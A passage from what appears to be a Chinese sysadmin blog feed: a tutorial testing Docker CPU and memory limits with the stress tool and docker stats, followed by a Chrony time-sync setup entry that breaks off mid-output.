    <content type="html"><![CDATA[<h2 id="Docker容器资源限制测试"><a href="#Docker容器资源限制测试" class="headerlink" title="Docker容器资源限制测试"></a>Docker容器资源限制测试</h2><p>Docker运行时的容器本质是进程。在Linux中，通过Namespace进行资源隔离，Cgroups进行资源限制。</p><h3 id="一、Docker容器Cpu资源限制测试"><a href="#一、Docker容器Cpu资源限制测试" class="headerlink" title="一、Docker容器Cpu资源限制测试"></a>一、Docker容器Cpu资源限制测试</h3><h4 id="容器资源CPU限制设置测试"><a href="#容器资源CPU限制设置测试" class="headerlink" title="容器资源CPU限制设置测试"></a>容器资源CPU限制设置测试</h4><p>默认所有的容器对于 CPU 的利用占比都是一样的，-c 或者 –cpu-shares 可以设置 CPU 利用率权重，默认为 1024，可以设置权重为 2 或者更高(单个 CPU 为 1024，两个为 2048，以此类推)。如果设置选项为 0，则系统会忽略该选项并且使用默认值 1024。通过以上设置，只会在 CPU 密集(繁忙)型运行进程时体现出来。当一个 container 空闲时，其它容器都是可以占用 CPU 的。cpu-shares 值为一个相对值，实际 CPU 利用率则取决于系统上运行容器的数量。</p><p>假如一个 1core 的主机运行 3 个 container，其中一个 cpu-shares 设置为 1024，而其它 cpu-shares 被设置成 512。当 3 个容器中的进程尝试使用 100% CPU 的时候「尝试使用 100% CPU 很重要，此时才可以体现设置值」，则设置 1024 的容器会占用 50% 的 CPU 时间。如果又添加一个 cpu-shares 为 1024 的 container，那么两个设置为 1024 的容器 CPU 利用占比为 33%，而另外两个则为 16.5%。简单的算法就是，所有设置的值相加，每个容器的占比就是 CPU 的利用率，如果只有一个容器，那么此时它无论设置 512 或者 1024，CPU 利用率都将是 100%。当然，如果主机是 3core，运行 3 个容器，两个 cpu-shares 设置为 512，一个设置为 1024，则此时每个 container 都能占用其中一个 CPU 为 100%。<br><a id="more"></a></p><h4 id="1-1、通过参数–cpu-shares分配cpu使用权重"><a href="#1-1、通过参数–cpu-shares分配cpu使用权重" class="headerlink" title="1.1、通过参数–cpu-shares分配cpu使用权重"></a>1.1、通过参数–cpu-shares分配cpu使用权重</h4><p>现在运行两个测试 container，一个权重设置为 2，一个权重设置 4，启动命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188 ~]<span class="comment"># docker run -it -d --cpu-shares 2 --name 2_cpu centos:7 /bin/bash</span></span><br><span class="line">f3f125f7455974be77e58c0864d045b3b56ae2d007bd9095c47faca50893547c</span><br><span class="line">[root@ok188 ~]<span class="comment"># docker run -it -d --cpu-shares 4 --name 4_cpu centos:7 /bin/bash</span></span><br><span class="line">5e623b55a22ef6d1e41e5978dd1c5d05d743b3a91498697db3b4b9c493f03f8b</span><br></pre></td></tr></table></figure><p>通过压测工具如Stress进行压测，Stress使用实例:</p><ul><li>产生13个cpu进程4个io进程1分钟后停止运行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188 ~]<span class="comment"># stress -c 13 -i 4 --verbose --timeout 1m</span></span><br></pre></td></tr></table></figure><ul><li><p>测试硬盘，通过mkstemp()生成800K大小的文件写入硬盘，对CPU、内存的使用要求很低</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@ok188</span> ~]<span class="meta"># stress -d 1 --hdd-noclean --hdd-bytes 800k</span></span><br></pre></td></tr></table></figure></li><li><p>产生13个进程，每个进程都反复不停的计算由rand ()产生随机数的平方根</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@ok188</span> ~]<span class="meta"># stress -c 13</span></span><br></pre></td></tr></table></figure></li><li><p>向磁盘中写入固定大小的文件，这个文件通过调用mkstemp()产生并保存在当前目录下，默认是文件产生后就被执行unlink(清除)操作，但是可以使用–hdd-bytes选项将产生的文件全部保存在当前目录下，这会将你的磁盘空间逐步耗尽</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 生成小文件</span></span><br><span class="line">[root<span class="symbol">@ok188</span> ~]<span class="meta"># stress -d 1 --hdd-noclean --hdd-bytes 13</span></span><br><span class="line"><span class="meta"># 生成大文件</span></span><br><span class="line">[root<span class="symbol">@ok188</span> ~]<span class="meta"># stress -d 1 --hdd-noclean --hdd-bytes 3G</span></span><br></pre></td></tr></table></figure></li></ul><p>对两个容器同时进行 CPU压测，在宿主机中查看两个容器CPU占用情况<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188 ~]# docker stats <span class="number">2</span>_cpu</span><br><span class="line">CONTAINER      CPU %         MEM USAGE / LIMIT     MEM %      NET I/O         BLOCK I/O                 </span><br><span class="line"><span class="number">2</span>_cpu          <span class="number">33.31</span>%        <span class="number">24.34</span>MiB / <span class="number">1.932</span>GiB   <span class="number">1.23</span>%     <span class="number">18.2</span>MB / <span class="number">322</span>kB   <span class="number">49.1</span>MB / <span class="number">27.7</span>MB</span><br></pre></td></tr></table></figure></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188 ~]# docker stats <span class="number">4</span>_cpu</span><br><span class="line">CONTAINER     CPU %         MEM USAGE / LIMIT     MEM %      NET I/O          BLOCK I/O                </span><br><span class="line"><span class="number">4</span>_cpu         <span class="number">65.96</span>%        <span class="number">38.82</span>MiB / <span class="number">1.932</span>GiB   <span class="number">1.96</span>%     <span class="number">18.3</span>MB / <span class="number">451</span>kB    <span class="number">8.19</span>kB / <span class="number">27.7</span>MB</span><br></pre></td></tr></table></figure><p>观察以上结果发现容器名为4_cpu权重比2_cpu大2倍，所以4_cpu可使用的cpu更多。<br>停止压测名为4_cpu的容器, 在宿主机中查看两个容器CPU占用情况<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188 ~]# docker stats <span class="number">2</span>_cpu</span><br><span class="line">CONTAINER      CPU %         MEM USAGE / LIMIT     MEM %      NET I/O         BLOCK I/O                 </span><br><span class="line"><span class="number">2</span>_cpu          <span class="number">99.50</span>%        <span class="number">24.34</span>MiB / <span class="number">1.932</span>GiB   <span class="number">1.23</span>%     <span class="number">18.2</span>MB / <span class="number">322</span>kB   <span class="number">49.1</span>MB / <span class="number">27.7</span>MB</span><br></pre></td></tr></table></figure></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188 ~]# docker stats <span class="number">4</span>_cpu</span><br><span class="line">CONTAINER     CPU %         MEM USAGE / LIMIT     MEM %      NET I/O          BLOCK I/O                </span><br><span class="line"><span class="number">4</span>_cpu         <span class="number">0.00</span>%         <span class="number">37.5</span>MiB / <span class="number">1.932</span>GiB   <span class="number">1.90</span>%     <span class="number">18.3</span>MB / <span class="number">452</span>kB    <span class="number">8.19</span>kB / <span class="number">27.7</span>MB</span><br></pre></td></tr></table></figure><p>结论参数cpu-shares 只是设置cpu使用权重，只会在 CPU 密集(繁忙)型运行进程时体现出来。当一个 container 空闲时，其它容器都是可以占用 CPU 的。<br>备注：物理主机为多核的情况下，显示的cpu使用比例有差异，本人测试主机为单核。</p><h4 id="1-2、通过-–cpu-period-amp-–cpu-quota-限制容器的-CPU-使用上限"><a href="#1-2、通过-–cpu-period-amp-–cpu-quota-限制容器的-CPU-使用上限" class="headerlink" title="1.2、通过 –cpu-period &amp; –cpu-quota 限制容器的 CPU 使用上限"></a>1.2、通过 –cpu-period &amp; –cpu-quota 限制容器的 CPU 使用上限</h4><p>默认的 CPU CFS「Completely Fair Scheduler」period 是 100ms。我们可以通过 –cpu-period 值限制容器的 CPU 使用。一般 –cpu-period 配合 –cpu-quota 一起使用。</p><p>为啥把这两个参数放一起呢？因为这两个参数是相互配合的，–cpu-period和–cpu-quota的这种配置叫Ceiling Enforcement Tunable Parameters，–cpu-shares的这种配置叫Relative Shares Tunable Parameters。–cpu-period是用来指定容器对CPU的使用要在多长时间内做一次重新分配，而–cpu-quota是用来指定在这个周期内，最多可以有多少时间用来跑这个容器。跟–cpu-shares不同的是这种配置是指定一个绝对值，而且没有弹性在里面，容器对CPU资源的使用绝对不会超过配置的值。</p><p>设置 cpu-period 为 100000，cpu-quota 为 50000，表示最多可以使用 cpu到50%。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@nsj-13-58 ~]# docker <span class="builtin-name">run</span> -it <span class="attribute">--cpu-period</span>=100000 <span class="attribute">--cpu-quota</span>=50000 --name 0.5_p_cpu centos:7 /bin/bash</span><br></pre></td></tr></table></figure></p><p>压测容器，并查看CPU占用情况：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188 ~]# docker stats <span class="number">0.5</span>_p_cpu</span><br><span class="line">CONTAINER       CPU %     MEM USAGE / LIMIT     MEM %         NET I/O             BLOCK I/O</span><br><span class="line"><span class="number">0.5</span>_p_cpu       <span class="number">50.33</span>%    <span class="number">22.12</span>MiB / <span class="number">1.932</span>GiB   <span class="number">1.12</span>%         <span class="number">18.3</span>MB / <span class="number">348</span>kB      <span class="number">524</span>kB / <span class="number">27.7</span>MB</span><br></pre></td></tr></table></figure></p><p>通过以上测试可以得知，–cpu-period 结合 –cpu-quota 配置是固定的，无论宿主机系统 CPU 是闲还是繁忙，如上配置，容器最多只能使用 CPU 到 50%。</p><h3 id="二、Docker容器Memory资源限制测试"><a href="#二、Docker容器Memory资源限制测试" class="headerlink" title="二、Docker容器Memory资源限制测试"></a>二、Docker容器Memory资源限制测试</h3><p>默认启动一个container，对于容器的内存是没有任何限制的。</p><h4 id="2-1、默认启动一个-container，对于容器的内存是没有任何限制的。"><a href="#2-1、默认启动一个-container，对于容器的内存是没有任何限制的。" class="headerlink" title="2.1、默认启动一个 container，对于容器的内存是没有任何限制的。"></a>2.1、默认启动一个 container，对于容器的内存是没有任何限制的。</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188 ~]<span class="comment"># docker run -it -d --name no_limit_memory centos:7 /bin/bash</span></span><br><span class="line">[root@ok188 ~]<span class="comment"># docker stats no_limit_memory</span></span><br><span class="line">CONTAINER           CPU %      MEM USAGE / LIMIT   MEM %      NET I/O             BLOCK I/O</span><br><span class="line">no_limit_memory     0.00%      932KiB / 1.932GiB   0.05%      586B / 0B           8.19kB / 0B         </span><br><span class="line">[root@ok188 ~]<span class="comment"># free -g</span></span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:             <span class="number"> 1 </span>         <span class="number"> 0 </span>         <span class="number"> 0 </span>         <span class="number"> 0 </span>         <span class="number"> 1 </span>          1</span><br><span class="line">Swap:            <span class="number"> 1 </span>         <span class="number"> 0 </span>          1</span><br></pre></td></tr></table></figure><p>MEM  LIMIT显示的是容器宿主机的内存大小，Mem+Swap的总大小</p><h4 id="2-2、通过-m-参数限制内存大小"><a href="#2-2、通过-m-参数限制内存大小" class="headerlink" title="2.2、通过 -m 参数限制内存大小"></a>2.2、通过 -m 参数限制内存大小</h4><p>设置-m值为500Mb，表示容器程序使用内存受限。按照官方文档的理解，如果指定 -m 内存限制时不添加 –memory-swap 选项，则表示容器中程序可以使用 500m内存和500m swap 内存。那么容器里程序可以跑到500m*2=1g后才会被oom给杀死。</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="meta">@ok188</span> ~]<span class="comment"># docker run -it -d -m 500m --name limit_memory_1 centos:7 /bin/bash     </span></span><br><span class="line"><span class="number">21</span>eb95cffa45972603cb0e67b7ee0724d019cd7182fa5668bf07665ddf4f83cc</span><br><span class="line">[root<span class="meta">@ok188</span> ~]<span class="comment"># docker stats limit_memory_1</span></span><br><span class="line">CONTAINER           CPU %       MEM USAGE / LIMIT   MEM %      NET <span class="literal">I</span>/O             BLOCK <span class="literal">I</span>/O</span><br><span class="line">limit_memory_1      <span class="number">0.00</span>%       <span class="number">916</span>KiB / <span class="number">500</span>MiB       <span class="number">0.09</span>%      <span class="number">586</span>B / <span class="number">0</span>B           <span class="number">0</span>B / <span class="number">0</span>B</span><br></pre></td></tr></table></figure><p>在libcontainer源码里<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory<span class="selector-class">.memsw</span><span class="selector-class">.limit_in_bytes</span></span><br></pre></td></tr></table></figure></p><p>值是被设置成我们指定的内存参数的两倍。</p><p>其中代码如下：<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// By default, MemorySwap is set to twice the size of RAM.</span></span><br><span class="line"><span class="comment">// If you want to omit MemorySwap, set it to `-1'.</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">d</span>.c.MemorySwap != -1 &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">err</span> := writeFile(<span class="keyword">dir</span>, <span class="string">"memory.memsw.limit_in_bytes"</span>, strconv.FormatInt(<span class="keyword">d</span>.c.<span class="keyword">Memory</span>*2, 10)); <span class="keyword">err</span> != nil &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">err</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用压测工具进行压测，当压测值是 memory + swap之和上限时，则容器中的进程会被直接 OOM kill。</p><h4 id="2-3参数–memory-swappiness-0-表示禁用容器-swap-功能。"><a href="#2-3参数–memory-swappiness-0-表示禁用容器-swap-功能。" class="headerlink" title="2.3参数–memory-swappiness=0 表示禁用容器 swap 功能。"></a>2.3参数–memory-swappiness=0 表示禁用容器 swap 功能。</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188 ~]# docker <span class="builtin-name">run</span> -it -d -m 500m <span class="attribute">--memory-swappiness</span>=0 --name limit_memory_noswap_1 centos:7 /bin/bash</span><br></pre></td></tr></table></figure><p>使用压测工具进行压测，当压测值是 1G ，则容器中的进程会被直接 OOM kill。查看容器内系统日志：</p><h4 id="2-4指定限制内存大小并且设置-memory-swap-值为-1"><a href="#2-4指定限制内存大小并且设置-memory-swap-值为-1" class="headerlink" title="2.4指定限制内存大小并且设置 memory-swap 值为 -1"></a>2.4指定限制内存大小并且设置 memory-swap 值为 -1</h4><p>表示容器程序使用内存受限，而 swap 空间使用不受限制（宿主 swap 支持使用多少则容器即可使用多少。如果 –memory-swap 设置小于 –memory 则设置不生效，使用默认设置）。–memory-swap -1<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@ok188</span> ~]<span class="meta"># docker run -it -d -m 500m --memory-swap -1  --name limit_memory_2 centos:7 /bin/bash</span></span><br></pre></td></tr></table></figure></p><h4 id="2-5指定限制内存大小并且设置-memory-swap-值"><a href="#2-5指定限制内存大小并且设置-memory-swap-值" class="headerlink" title="2.5指定限制内存大小并且设置 memory-swap 值"></a>2.5指定限制内存大小并且设置 memory-swap 值</h4><p>指定限制内存大小500Mb并且设置 memory-swap 值400Mb当压测值是900Mb时，则容器中的进程会被直接 OOM kill。<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@ok188</span> ~]<span class="meta"># docker run -it -d -m 500m --memory-swap 400m  --name limit_memory_3 centos:7 /bin/bash</span></span><br></pre></td></tr></table></figure></p><p>备注：实际生产环境不推荐使用swap功能，建议直接禁用swap功能。</p><h4 id="2-6-参数–oom-kill-disable-，加上之后则达到限制内存之后也不会被-kill"><a href="#2-6-参数–oom-kill-disable-，加上之后则达到限制内存之后也不会被-kill" class="headerlink" title="2.6 参数–oom-kill-disable ，加上之后则达到限制内存之后也不会被 kill"></a>2.6 参数–oom-kill-disable ，加上之后则达到限制内存之后也不会被 kill</h4><p>正常情况不添加 –oom-kill-disable 容器程序内存使用超过限制后则会直接 OOM kill，加上之后则达到限制内存之后也不会被 kill。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188 ~]# docker <span class="builtin-name">run</span> -it -d -m 500m --oom-kill-<span class="builtin-name">disable</span> --name limit_memory_4 centos:7 /bin/bash</span><br></pre></td></tr></table></figure></p><p>==注意如果是以下的这种没有对容器作任何资源限制的情况，添加 –oom-kill-disable 选项就比较危险了：==</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188 ~]# docker <span class="builtin-name">run</span> -it -d --oom-kill-<span class="builtin-name">disable</span> --name limit_memory_5 centos:7 /bin/bash</span><br></pre></td></tr></table></figure><p>因为此时容器内存没有限制，使用的上限值是物理内存的上限值。 并且不会被 oom kill，此时系统则会 kill 系统进程用于释放内存。</p><h3 id="后记：目前-Docker-支持的资源限制选项"><a href="#后记：目前-Docker-支持的资源限制选项" class="headerlink" title="后记：目前 Docker 支持的资源限制选项"></a>后记：目前 Docker 支持的资源限制选项</h3><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td>-m, –memory=””</td><td>Memory limit (format: <number>[<unit>]). Number is a positive integer. Unit can be one of b, k, m, or g. Minimum is 4M.  </unit></number></td></tr><tr><td>–memory-swap=””</td><td>Total memory limit (memory + swap, format: <number>[<unit>]). Number is a positive integer. Unit can be one of b, k, m, or g.</unit></number></td></tr><tr><td>–memory-reservation=””</td><td>Memory soft limit (format: <number>[<unit>]). Number is a positive integer. Unit can be one of b, k, m, or g.</unit></number></td></tr><tr><td>–kernel-memory=””</td><td>Kernel memory limit (format: <number>[<unit>]). Number is a positive integer. Unit can be one of b, k, m, or g. Minimum is 4M.</unit></number></td></tr><tr><td>-c, –cpu-shares=0</td><td>CPU shares (relative weight)</td></tr><tr><td>–cpu-period=0</td><td>Limit the CPU CFS (Completely Fair Scheduler) period</td></tr><tr><td>–cpuset-cpus=””</td><td>CPUs in which to allow execution (0-3, 0,1)</td></tr><tr><td>–cpuset-mems=””</td><td>Memory nodes (MEMs) in which to allow execution (0-3, 0,1). Only effective on NUMA systems.</td></tr><tr><td>–cpu-quota=0</td><td>Limit the CPU CFS (Completely Fair Scheduler) quota</td></tr><tr><td>–blkio-weight=0</td><td>Block IO weight (relative weight) accepts a weight value between 10 and 1000.</td></tr><tr><td>–blkio-weight-device=””</td><td>Block IO weight (relative device weight, format: DEVICE_NAME:WEIGHT)</td></tr><tr><td>–device-read-bps=””</td><td>Limit read rate from a device (format: <device-path>:<number>[<unit>]). Number is a positive integer. Unit can be one of kb, mb, or gb.</unit></number></device-path></td></tr><tr><td>–device-write-bps=””</td><td>Limit write rate to a device (format: <device-path>:<number>[<unit>]). Number is a positive integer. Unit can be one of kb, mb, or gb.</unit></number></device-path></td></tr><tr><td>–device-read-iops=””</td><td>Limit read rate (IO per second) from a device (format: <device-path>:<number>). Number is a positive integer.</number></device-path></td></tr><tr><td>–device-write-iops=””</td><td>Limit write rate (IO per second) to a device (format: <device-path>:<number>). Number is a positive integer.</number></device-path></td></tr><tr><td>–oom-kill-disable=false</td><td>Whether to disable OOM Killer for the container or not.</td></tr><tr><td>–memory-swappiness=””</td><td>Tune a container’s memory swappiness behavior. Accepts an integer between 0 and 100.</td></tr><tr><td>–shm-size=””</td><td>Size of /dev/shm. The format is <number><unit>. number must be greater than 0. Unit is optional and can be b (bytes), k (kilobytes), m (megabytes), or g (gigabytes). If you omit the unit, the system uses bytes. If you omit the size entirely, the system uses 64m.</unit></number></td></tr></tbody></table><h5 id="附Docker容器限制源码路径："><a href="#附Docker容器限制源码路径：" class="headerlink" title="附Docker容器限制源码路径："></a>附Docker容器限制源码路径：</h5><p><a href="https://github.com/opencontainers/runc/tree/master/libcontainer/cgroups/fs" target="_blank" rel="noopener">github.com/opencontainers/runc/libcontainer/cgroups/fs</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Docker容器资源限制测试&quot;&gt;&lt;a href=&quot;#Docker容器资源限制测试&quot; class=&quot;headerlink&quot; title=&quot;Docker容器资源限制测试&quot;&gt;&lt;/a&gt;Docker容器资源限制测试&lt;/h2&gt;&lt;p&gt;Docker运行时的容器本质是进程。在Linux中，通过Namespace进行资源隔离，Cgroups进行资源限制。&lt;/p&gt;
&lt;h3 id=&quot;一、Docker容器Cpu资源限制测试&quot;&gt;&lt;a href=&quot;#一、Docker容器Cpu资源限制测试&quot; class=&quot;headerlink&quot; title=&quot;一、Docker容器Cpu资源限制测试&quot;&gt;&lt;/a&gt;一、Docker容器Cpu资源限制测试&lt;/h3&gt;&lt;h4 id=&quot;容器资源CPU限制设置测试&quot;&gt;&lt;a href=&quot;#容器资源CPU限制设置测试&quot; class=&quot;headerlink&quot; title=&quot;容器资源CPU限制设置测试&quot;&gt;&lt;/a&gt;容器资源CPU限制设置测试&lt;/h4&gt;&lt;p&gt;默认所有的容器对于 CPU 的利用占比都是一样的，-c 或者 –cpu-shares 可以设置 CPU 利用率权重，默认为 1024，可以设置权重为 2 或者更高(单个 CPU 为 1024，两个为 2048，以此类推)。如果设置选项为 0，则系统会忽略该选项并且使用默认值 1024。通过以上设置，只会在 CPU 密集(繁忙)型运行进程时体现出来。当一个 container 空闲时，其它容器都是可以占用 CPU 的。cpu-shares 值为一个相对值，实际 CPU 利用率则取决于系统上运行容器的数量。&lt;/p&gt;
&lt;p&gt;假如一个 1core 的主机运行 3 个 container，其中一个 cpu-shares 设置为 1024，而其它 cpu-shares 被设置成 512。当 3 个容器中的进程尝试使用 100% CPU 的时候「尝试使用 100% CPU 很重要，此时才可以体现设置值」，则设置 1024 的容器会占用 50% 的 CPU 时间。如果又添加一个 cpu-shares 为 1024 的 container，那么两个设置为 1024 的容器 CPU 利用占比为 33%，而另外两个则为 16.5%。简单的算法就是，所有设置的值相加，每个容器的占比就是 CPU 的利用率，如果只有一个容器，那么此时它无论设置 512 或者 1024，CPU 利用率都将是 100%。当然，如果主机是 3core，运行 3 个容器，两个 cpu-shares 设置为 512，一个设置为 1024，则此时每个 container 都能占用其中一个 CPU 为 100%。&lt;br&gt;
    
    </summary>
    
      <category term="系统运维" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
    
      <category term="Docker" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/Docker/"/>
    
    
      <category term="Docker_Container_Limit" scheme="https://linux7788.com/tags/Docker-Container-Limit/"/>
    
      <category term="Docker" scheme="https://linux7788.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统下校时服务Chrony使用</title>
    <link href="https://linux7788.com/linux_ops/linux_Chrony/"/>
    <id>https://linux7788.com/linux_ops/linux_Chrony/</id>
    <published>2017-11-29T03:58:25.000Z</published>
    <updated>2018-05-18T15:32:59.039Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux系统下校时服务Chrony使用"><a href="#Linux系统下校时服务Chrony使用" class="headerlink" title="Linux系统下校时服务Chrony使用"></a>Linux系统下校时服务Chrony使用</h1><p>Chrony 应用本身已经有几年了，其是是网络时间协议的 (NTP) 的另一种实现。一直以来众多发行版里标配的都是ntpd对时服务，自rhel7/centos7 起，Chrony做为了发行版里的标配服务，不过老的ntpd服务依旧在rhel7/centos7里可以找到 。Chrony可以同时做为ntp服务的客户端和服务端。默认安装完后有两个程序chronyd和chronyc 。chronyd是一个在系统后台运行的守护进程，chronyc是用来监控chronyd性能和配置其参数程序</p><h2 id="安装和启用"><a href="#安装和启用" class="headerlink" title="安装和启用"></a>安装和启用</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188.net ~]# yum install -y chrony</span><br><span class="line">[root@ok188.net ~]# cat &lt;&lt; EOF &gt; /etc/chrony.conf</span><br><span class="line"><span class="comment"># 使用上层的internet ntp服务器</span></span><br><span class="line">server time1.aliyun.com iburst</span><br><span class="line">server time2.aliyun.com iburst</span><br><span class="line">server time3.aliyun.com iburst</span><br><span class="line">server time4.aliyun.com iburst</span><br><span class="line">server time5.aliyun.com iburst</span><br><span class="line">stratumweight 0</span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line">rtcsync</span><br><span class="line">makestep 10 3</span><br><span class="line">bindcmdaddress 127.0.0.1</span><br><span class="line">bindcmdaddress ::1</span><br><span class="line">keyfile /etc/chrony.keys</span><br><span class="line">commandkey 1</span><br><span class="line">generatecommandkey</span><br><span class="line">noclientlog</span><br><span class="line">logchange 0.5</span><br><span class="line">logdir /var/log/chrony</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">[root@ok188.net ~]# systemctl stop ntpd</span><br><span class="line">[root@ok188.net ~]# systemctl <span class="builtin-name">disable</span> ntpd</span><br><span class="line">[root@ok188.net ~]# systemctl <span class="builtin-name">enable</span> chronyd.service</span><br><span class="line">[root@ok188.net ~]# systemctl start chronyd.service</span><br></pre></td></tr></table></figure><h4 id="配置文件解析"><a href="#配置文件解析" class="headerlink" title="配置文件解析"></a>配置文件解析</h4><p>如果本局域网内有对时服务开启的话，通过将上面的几条serer记录删除，增加指定局域网内的对时服务器并restart chrony服务即可。其中主要的配置参数有如下几个：<br><a id="more"></a></p><ul><li>server - 该参数可以多次用于添加时钟服务器，必须以”server “格式使用。一般而言，你想添加多少服务器，就可以添加多少服务器；</li><li>stratumweight - stratumweight指令设置当chronyd从可用源中选择同步源时，每个层应该添加多少距离到同步距离。默认情况下，CentOS中设置为0，让chronyd在选择源时忽略源的层级；</li><li>driftfile - chronyd程序的主要行为之一，就是根据实际时间计算出计算机增减时间的比率，将它记录到一个文件中是最合理的，它会在重启后为系统时钟作出补偿，甚至可能的话，会从时钟服务器获得较好的估值；</li><li>rtcsync - rtcsync指令将启用一个内核模式，在该模式中，系统时间每11分钟会拷贝到实时时钟（RTC）；</li><li>allow / deny - 这里你可以指定一台主机、子网，或者网络以允许或拒绝NTP连接到扮演时钟服务器的机器；</li><li>cmdallow / cmddeny - 跟上面相类似，只是你可以指定哪个IP地址或哪台主机可以通过chronyd使用控制命令；</li><li>bindcmdaddress - 该指令允许你限制chronyd监听哪个网络接口的命令包（由chronyc执行）。该指令通过cmddeny机制提供了一个除上述限制以外可用的额外的访问控制等级。</li><li>makestep - 通常，chronyd将根据需求通过减慢或加速时钟，使得系统逐步纠正所有时间偏差。在某些特定情况下，系统时钟可能会漂移过快，导致该调整过程消耗很长的时间来纠正系统时钟。该指令强制chronyd在调整期大于某个阀值时步进调整系统时钟，但只有在因为chronyd启动时间超过指定限制（可使用负值来禁用限制），没有更多时钟更新时才生效。</li></ul><h2 id="查看同步状态"><a href="#查看同步状态" class="headerlink" title="查看同步状态"></a>查看同步状态</h2><p>检查ntp源服务器状态：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@ok188.net ~]# chronyc sourcestats</span><br><span class="line"><span class="number">210</span> Number of sources = <span class="number">4</span></span><br><span class="line">Name/IP Address            NP  NR  Span  Frequency  Freq Skew  Offset  Std Dev</span><br><span class="line">==============================================================================</span><br><span class="line">time6.aliyun.com           <span class="number">14</span>  <span class="number">10</span>   <span class="number">81</span>m     <span class="number">-0.017</span>      <span class="number">0.182</span>  +<span class="number">1290</span>us   <span class="number">261</span>us</span><br><span class="line">time4.aliyun.com           <span class="number">11</span>   <span class="number">5</span>   <span class="number">77</span>m     <span class="number">-0.122</span>      <span class="number">0.825</span>   +<span class="number">513</span>us  <span class="number">1029</span>us</span><br><span class="line">time5.aliyun.com           <span class="number">12</span>   <span class="number">7</span>   <span class="number">73</span>m     +<span class="number">0.052</span>      <span class="number">0.262</span>  <span class="number">-1194</span>us   <span 